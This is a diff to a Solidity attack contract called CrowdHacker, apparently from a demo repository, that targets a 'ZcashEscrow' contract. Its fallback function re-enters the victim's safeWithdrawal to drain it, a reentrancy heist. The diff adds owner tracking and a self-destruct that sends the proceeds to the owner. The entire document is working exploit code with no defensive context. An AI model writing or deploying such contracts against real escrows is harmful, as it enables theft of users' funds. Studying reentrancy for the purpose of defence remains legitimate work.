@@ -5,6 +5,11 @@ import "./ZcashEscrow.solc";
 contract CrowdHacker {
 
   ZcashEscrow public victim;
+  address public owner;
+    
+  function CrowdHacker() {
+    owner = msg.sender;
+  }
 
   function initiateHack(address _victim) {
     victim = ZcashEscrow(_victim);
@@ -12,7 +17,10 @@ contract CrowdHacker {
 
   // Pay into the CrowdHacker to seed the heist
   function seedThePot() payable {
-    if (!victim.send(msg.value)) {
+  }
+
+  function payIntoVictim() {
+    if (!address(victim).send(this.balance)) {
       throw;
     } // pass the money along, or throw a tantrum if we can't
   }
@@ -23,6 +31,12 @@ contract CrowdHacker {
 
   function() payable {
     victim.safeWithdrawal();
+  }
+
+  function kill() {
+    if (msg.sender == owner) {
+      selfdestruct(owner);
+    }
   }
 
 }
